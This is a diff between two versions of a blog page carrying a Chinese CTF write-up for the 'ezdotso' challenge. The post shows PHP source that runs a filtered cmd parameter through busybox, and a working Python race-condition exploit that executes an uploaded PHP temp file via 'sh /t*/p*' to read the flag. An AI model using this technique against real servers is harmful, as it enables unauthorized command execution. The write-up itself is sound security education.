@@ -25,11 +25,11 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Muse',
+    scheme: 'Gemini',
     version: '7.4.0',
     exturl: false,
     sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
+    copycode: {"enable":"enable","show_result":false,"style":"mac"},
     back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
     bookmark: {"enable":false,"color":"#222","save":"auto"},
     fancybox: false,
@@ -55,22 +55,22 @@
   };
 </script>
 
-  <meta name="description" content="题目给了一个源码和一个so文件源码如下（稍微加了一点输出） 12345678910111213141516171819202122232425262728293031323334353637383940&amp;lt;?php$param = array();parse_str($_SERVER[&apos;QUERY_STRING&apos;]);if (isset($action))&amp;#123;    switch($a">
-<meta name="keywords" content="php,ctf,re">
+  <meta name="description" content="ezdotso题目给了一个源码和一个so文件源码如下（稍微加了一点输出 12345678910111213141516171819202122232425262728293031323334353637383940&amp;lt;?php$param = array();parse_str($_SERVER[&apos;QUERY_STRING&apos;]);if (isset($action))&amp;#123;    swi">
+<meta name="keywords" content="php,writeup,race-condition">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ezdotso通过php临时文件竞争解法">
-<meta property="og:url" content="http://yoursite.com/2019/10/06/ezdotso-writeup-by-race-condition/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="题目给了一个源码和一个so文件源码如下（稍微加了一点输出） 12345678910111213141516171819202122232425262728293031323334353637383940&amp;lt;?php$param = array();parse_str($_SERVER[&apos;QUERY_STRING&apos;]);if (isset($action))&amp;#123;    switch($a">
+<meta property="og:title" content="ezdotso-by-race-condition-writeup">
+<meta property="og:url" content="https://blog.sometimenaive.com/2020/04/18/ezdotso_writeup_race_condition/index.html">
+<meta property="og:site_name" content="yxxx&#39;s blog">
+<meta property="og:description" content="ezdotso题目给了一个源码和一个so文件源码如下（稍微加了一点输出 12345678910111213141516171819202122232425262728293031323334353637383940&amp;lt;?php$param = array();parse_str($_SERVER[&apos;QUERY_STRING&apos;]);if (isset($action))&amp;#123;    swi">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20181201093310195-3627990.png">
-<meta property="og:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20181201093534582-3628134.png">
-<meta property="og:updated_time" content="2019-10-06T03:56:38.886Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/waderwu/blog-img/2020/4/image-20181201093310195-3627990.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/waderwu/blog-img/2020/4/image-20181201093534582-3628134.png">
+<meta property="og:updated_time" content="2020-04-18T08:10:43.981Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ezdotso通过php临时文件竞争解法">
-<meta name="twitter:description" content="题目给了一个源码和一个so文件源码如下（稍微加了一点输出） 12345678910111213141516171819202122232425262728293031323334353637383940&amp;lt;?php$param = array();parse_str($_SERVER[&apos;QUERY_STRING&apos;]);if (isset($action))&amp;#123;    switch($a">
-<meta name="twitter:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20181201093310195-3627990.png">
-  <link rel="canonical" href="http://yoursite.com/2019/10/06/ezdotso-writeup-by-race-condition/">
+<meta name="twitter:title" content="ezdotso-by-race-condition-writeup">
+<meta name="twitter:description" content="ezdotso题目给了一个源码和一个so文件源码如下（稍微加了一点输出 12345678910111213141516171819202122232425262728293031323334353637383940&amp;lt;?php$param = array();parse_str($_SERVER[&apos;QUERY_STRING&apos;]);if (isset($action))&amp;#123;    swi">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/waderwu/blog-img/2020/4/image-20181201093310195-3627990.png">
+  <link rel="canonical" href="https://blog.sometimenaive.com/2020/04/18/ezdotso_writeup_race_condition/">
 
 
 <script id="page-configurations">
@@ -84,7 +84,7 @@
   };
 </script>
 
-  <title>ezdotso通过php临时文件竞争解法 | Hexo</title>
+  <title>ezdotso-by-race-condition-writeup | yxxx's blog</title>
   
 
 
@@ -131,7 +131,7 @@
     <div>
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Hexo</span>
+        <span class="site-title">yxxx's blog</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -165,16 +165,36 @@
       
       
         
-        <li class="menu-item menu-item-archives">
+        <li class="menu-item menu-item-about">
       
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
 
   </li>
   </ul>
-
-    
 
 </nav>
 </div>
@@ -190,6 +210,8 @@
     <main id="main" class="main">
       <div class="main-inner">
         <div class="content-wrap">
+            
+
           <div id="content" class="content">
             
 
@@ -199,19 +221,19 @@
   
   
   <div class="post-block post">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/06/ezdotso-writeup-by-race-condition/">
+    <link itemprop="mainEntityOfPage" href="https://blog.sometimenaive.com/2020/04/18/ezdotso_writeup_race_condition/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wuyx">
+      <meta itemprop="name" content="yxxx">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="yxxx's blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">ezdotso通过php临时文件竞争解法
+        <h1 class="post-title" itemprop="name headline">ezdotso-by-race-condition-writeup
 
           
         </h1>
@@ -227,12 +249,8 @@
                 
               
 
-              <time title="Created: 2019-10-06 11:37:15 / Modified: 11:56:38" itemprop="dateCreated datePublished" datetime="2019-10-06T11:37:15+08:00">2019-10-06</time>
+              <time title="Created: 2020-04-18 16:10:43" itemprop="dateCreated datePublished" datetime="2020-04-18T16:10:43+08:00">2020-04-18</time>
             </span>
-          
-            
-
-            
           
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -240,7 +258,7 @@
               </span>
               <span class="post-meta-item-text">In</span>
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/websecurity/" itemprop="url" rel="index"><span itemprop="name">websecurity</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a></span>
 
                 
                 
@@ -259,48 +277,48 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>题目给了一个源码和一个so文件源码如下（稍微加了一点输出）</p>
+        <h1 id="ezdotso"><a href="#ezdotso" class="headerlink" title="ezdotso"></a>ezdotso</h1><p>题目给了一个源码和一个so文件<br>源码如下（稍微加了一点输出</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$param = <span class="keyword">array</span>();</span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($action))&#123;</span><br><span class="line">    <span class="keyword">switch</span>($action)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"php_info"</span>:</span><br><span class="line">        <span class="keyword">echo</span> call_user_func_array(<span class="string">"php_info"</span>,$param);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"cmd"</span>:</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($cmd))&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_string($cmd))&#123;</span><br><span class="line">                <span class="keyword">if</span> (strlen($cmd)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                $pat1 = <span class="string">"/[^0-9a-zA-Z \/\*]/"</span>;</span><br><span class="line">                $count1 = preg_match($pat1, $cmd);</span><br><span class="line">                <span class="keyword">echo</span> $count1;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                <span class="keyword">if</span> ($count1&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">"1111"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $pat2 = <span class="string">"/^[a-zA-Z]+ [0-9a-zA-Z\/\*]+$/"</span>;</span><br><span class="line">                $count2 = preg_match($pat2, $cmd);</span><br><span class="line">                <span class="keyword">echo</span> $count2;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                <span class="keyword">if</span> ($count2==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">"2222"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $c = <span class="string">"busybox "</span>.$cmd;</span><br><span class="line">                system($c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> call_user_func_array(<span class="string">"hello"</span>,$param);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>在分析代码之前解两个问题</p>
 <ul>
-<li><p>busybox 是啥？</p>
-<p>busybox 是一个程序，通常会通过<code>busybox ls</code> 来执行命令，其实就相当于执行了<code>ls</code> 这个命令。<code>busybox ls</code> 中的<code>ls</code> 其实相当于给busybox传的参数，大概有这么多能用的参数。</p>
+<li>busybox 是啥？<br>busybox 是一个程序，通常会通过<code>busybox ls</code> 来执行命令，其实就相当于执行了<code>ls</code> 这个命令。<code>busybox ls</code> 中的<code>ls</code> 其实相当于给busybox传的参数，大概有这么多能用的参数。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">acpid, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl, bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chpasswd, chroot, chvt, clear, cmp, cp, cpio, crond, crontab,cttyhack, cut, date, dc, dd, deallocvt, depmod, devmem, df, diff, dirname, dmesg, dnsdomainname, dos2unix, dpkg, dpkg-deb, du, dumpkmap, dumpleases, echo, ed, egrep, env, expand, expr, false,fdisk, fgrep, find, fold, free, freeramdisk, fstrim, ftpget, ftpput, getopt, getty, grep, groups, gunzip, gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id, ifconfig, ifdown, ifup,init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last, less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup, ls, lsmod, lzcat, lzma, lzop, lzopcat, md5sum, mdev,microcom, mkdir, mkfifo, mknod, mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc, netstat, nslookup, od, openvt, passwd, patch, pidof, ping, ping6, pivot_root, poweroff, printf,ps, pwd, rdate, readlink, realpath, reboot, renice, reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq, setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,start-stop-daemon, stat, static-sh, strings, stty, su, sulogin, swapoff, swapon, switch_root, sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, telnetd, test, tftp, time, timeout, top,touch, tr, traceroute, traceroute6, true, tty, tunctl, udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos, unlzma, unlzop, unxz, unzip, uptime, usleep,uudecode, uuencode,vconfig, vi, watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes, zcat</span><br></pre></td></tr></table></figure>
+
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">acpid, adjtimex, ar, arp, arping, ash, awk, basename, blockdev, brctl, bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chpasswd, chroot, chvt, clear, cmp, cp, cpio, crond, crontab,cttyhack, cut, date, dc, dd, deallocvt, depmod, devmem, df, diff, dirname, dmesg, dnsdomainname, dos2unix, dpkg, dpkg-deb, du, dumpkmap, dumpleases, echo, ed, egrep, env, expand, expr, false,fdisk, fgrep, find, fold, free, freeramdisk, fstrim, ftpget, ftpput, getopt, getty, grep, groups, gunzip, gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id, ifconfig, ifdown, ifup,init, insmod, ionice, ip, ipcalc, kill, killall, klogd, last, less, ln, loadfont, loadkmap, logger, login, logname, logread, losetup, ls, lsmod, lzcat, lzma, lzop, lzopcat, md5sum, mdev,microcom, mkdir, mkfifo, mknod, mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc, netstat, nslookup, od, openvt, passwd, patch, pidof, ping, ping6, pivot_root, poweroff, printf,ps, pwd, rdate, readlink, realpath, reboot, renice, reset, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq, setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,start-stop-daemon, stat, static-sh, strings, stty, su, sulogin, swapoff, swapon, switch_root, sync, sysctl, syslogd, tac, tail, tar, taskset, tee, telnet, telnetd, test, tftp, time, timeout, top,touch, tr, traceroute, traceroute6, true, tty, tunctl, udhcpc, udhcpd, umount, uname, uncompress, unexpand, uniq, unix2dos, unlzma, unlzop, unxz, unzip, uptime, usleep,uudecode, uuencode,vconfig, vi, watch, watchdog, wc, wget, which, who, whoami, xargs, xz, xzcat, yes, zcat</span><br></pre></td></tr></table></figure>
-
+<p>为啥没有权读文件但执行readlflag程序却读出文件？<br>文件权限除了有正常的<code>rwx</code> 权限外</p>
 <ul>
-<li><p>为啥没有权限读文件但执行<code>readlflag</code>程序却读出文件？<br>文件权限除了有正常的<code>rwx</code> 权限外</p>
-<ul>
-<li><p>对于文件还有权限<code>s</code> 表示<code>setuid</code> 表示文件在执行阶段拥有文件创建者的权限。<br><code>-rwsr-xr-x 1 root root 54256 May 17  2017 passwd</code> 表示任何用户执行<code>passwd</code> 时创建的进程对应的权限是root</p>
+<li><p>对于文件还有权限<code>s</code> 表示<code>setuid</code> 表示文件在执行阶段拥有文件创建者的权限。<br><code>-rwsr-xr-x 1 root root 54256 May 17  2017 passwd</code> 表示任何人在执行的<code>passwd</code> 时创建的进程对应的权限是root</p>
 </li>
 <li><p>对于文件夹还有<code>setgid</code> 目录被设置该位后, 任何用户在此目录下创建的文件都具有和该目录所属的组相同的组</p>
 </li>
-<li><p><code>sticky bit</code>该位可以理解为防删除位. 一个文件是否可以被某用户删除, 主要取决于该文件所属的组是否对该用户具有写权限. 如果没有写权限, 则这个目录下的所有文件都不能被删除, 同时也不能添加新的文件. 如果希望用户能够添加文件,但同时不能删除文件, 则可以对文件使用sticky bit位. 设置该位后, 就算用户对目录具有写权限, 也不能删除该文件</p>
+<li><p><code>sticky bit</code>该位可以理解为防删除位. 一个文件是否可以被某用户删除, 主要取决于该文件所属的组是否对该目录具有写权限. 如果没有写权限, 则这个目录下的所有文件都不能被删除, 同时也不能添加新的文件. 如果希望用户能够添加文件但同时不能删除文件, 则可以对文件使用sticky bit位. 设置该位后, 就算用户对目录具有写权限, 也不能删除该文件</p>
 </li>
 </ul>
-</li>
-</ul>
-<p><img src="/Users/waderwu/notebook/img/image-20181201093310195-3627990.png" alt="image-20181201093310195"></p>
-<p>可以明显的看到有三个功能</p>
+<p><img src="https://cdn.jsdelivr.net/gh/waderwu/blog-img/2020/4/image-20181201093310195-3627990.png" alt="image-20181201093310195"></p>
+<p>从刚开始的源代码中可以明显看到有三个功能</p>
 <ul>
 <li>php_info 显示<code>phpinfo</code></li>
 <li>cmd 执行命令的</li>
 <li>Hello 看起来没啥用，官方的预期解法就在这里</li>
 </ul>
-<p>通过查看<code>phpinfo</code> 我们可以看到php加载了<code>ezdotso.so</code> ，出题人的意思应该是让我们去分析<code>so</code>文件，但是作为web狗怎么能向二进制低头呢？直接看没有涉及到<code>ezdotso.so</code> 的东西，也就是<code>action=cmd</code>的部分</p>
+<p>通过查看<code>phpinfo</code> 我们可以看到加载了<code>ezdotso.so</code> ，出题人的意思应该是让我们去分析<code>so</code>文件，但是作为web狗怎么能向二进制低头呢？</p>
+<p>直接看没有涉及到<code>ezdotso.so</code> 的东西，也就是<code>action=cmd</code>的部分。</p>
 <p>要满足三个条件才能执行</p>
 <ul>
 <li>cmd长度不能大于9</li>
 <li>不能包含<code>0-9a-zA-Z /*</code> 以外的字符</li>
 <li>只能是以字符+空格+<code>0-9a-zA-Z /*</code> 的形式</li>
 </ul>
-<p>通过<code>cmd=ls /h*/*</code> 可以发现有个<code>readflag</code> 程序，所以思路比较清晰了:要能命令执行, 通过运行<code>readflag</code> 拿flag。<br><del>可以通过<code>busybox /h*/r*</code> 但是这样不满足正则。陷入僵局。</del><br><strong>php上传产生的临时文件</strong>再次发挥了作用<br>php在上传文件的时候会在<code>/tmp/</code> 文件夹下面生成<code>/tmp/phpxxxxxx</code> 文件，所以我们可以在上传的同时去执行<br><code>sh /t*/p*</code> 刚好9个字符。</p>
+<p>通过<code>cmd=ls /h*/*</code> 可以发现有个<code>readflag</code> 程序，所以思路比较清晰了运行<code>readflag</code> 就能拿到flag了。</p>
+<p>可以通过<code>busybox /h*/r*</code> 但是这样不满足正则。陷入僵局。</p>
+<p><strong>php上传产生的临时文件</strong>再次发挥了作用</p>
+<p>php在上传文件的时候会在<code>/tmp/</code> 文件夹下面生成<code>/tmp/phpxxxxxx</code> 文件，所以我们可以在上传的同时去执行</p>
+<p><code>sh /t*/p*</code> 刚好9个字符。</p>
 <p>下面是利用脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://u.cn:3423"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"sh /t*/p*"</span></span><br><span class="line"><span class="keyword">assert</span>(len(payload)&lt;<span class="number">10</span>)</span><br><span class="line">params = &#123;<span class="string">"action"</span>:<span class="string">"cmd"</span>, <span class="string">"cmd"</span>:payload&#125;</span><br><span class="line">files = &#123;<span class="string">"hhh"</span>:<span class="string">"/tmp/readflag"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.post(url, params=params, files=files)</span><br><span class="line">    <span class="comment">#print(repr(r.text))</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"0&lt;br&gt;1&lt;br&gt;"</span> != r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.post(url, files=files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = threading.Thread(target=go, args=())</span><br><span class="line">    t.start()</span><br><span class="line">    <span class="comment">#t = threading.Thread(target=upload, args=())</span></span><br><span class="line">    <span class="comment">#t.start()</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/Users/waderwu/notebook/img/image-20181201093534582-3628134.png" alt="image-20181201093534582"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/waderwu/blog-img/2020/4/image-20181201093534582-3628134.png" alt="image-20181201093534582"></p>
 
     </div>
 
@@ -318,9 +336,9 @@
             
               <a href="/tags/php/" rel="tag"># php</a>
             
-              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
             
-              <a href="/tags/re/" rel="tag"># re</a>
+              <a href="/tags/race-condition/" rel="tag"># race-condition</a>
             
           </div>
         
@@ -330,8 +348,8 @@
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2019/09/09/php-re-tricks/" rel="next" title="正则表达式中的奇技淫巧">
-                  <i class="fa fa-chevron-left"></i> 正则表达式中的奇技淫巧
+                <a href="/2020/04/18/l33t-writeup/" rel="next" title="l33t writeup">
+                  <i class="fa fa-chevron-left"></i> l33t writeup
                 </a>
               
             </div>
@@ -339,10 +357,6 @@
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2020/04/18/l33t writeup/" rel="prev" title="">
-                   <i class="fa fa-chevron-right"></i>
-                </a>
               
             </div>
           </div>
@@ -391,20 +405,22 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ezdotso"><span class="nav-number">1.</span> <span class="nav-text">ezdotso</span></a></li></ol></div>
+        
       </div>
       <!--/noindex-->
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">wuyx</p>
+  <p class="site-author-name" itemprop="name">yxxx</p>
   <div class="site-description" itemprop="description"></div>
 </div>
   <nav class="site-state motion-element">
       <div class="site-state-item site-state-posts">
         
-          <a href="/archives/">
+          <a href="/archives">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -430,7 +446,7 @@
             <a href="/tags/">
           
         
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span>
         </a>
       </div>
@@ -455,11 +471,11 @@
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">wuyx</span>
+  <span class="author" itemprop="copyrightHolder">yxxx</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
   <span class="post-meta-divider">|</span>
-  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.0</div>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
 
         
 
@@ -486,7 +502,8 @@
   <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
   <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
 <script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
-<script src="/js/schemes/muse.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
 <script src="/js/next-boot.js?v=7.4.0"></script>
 
 
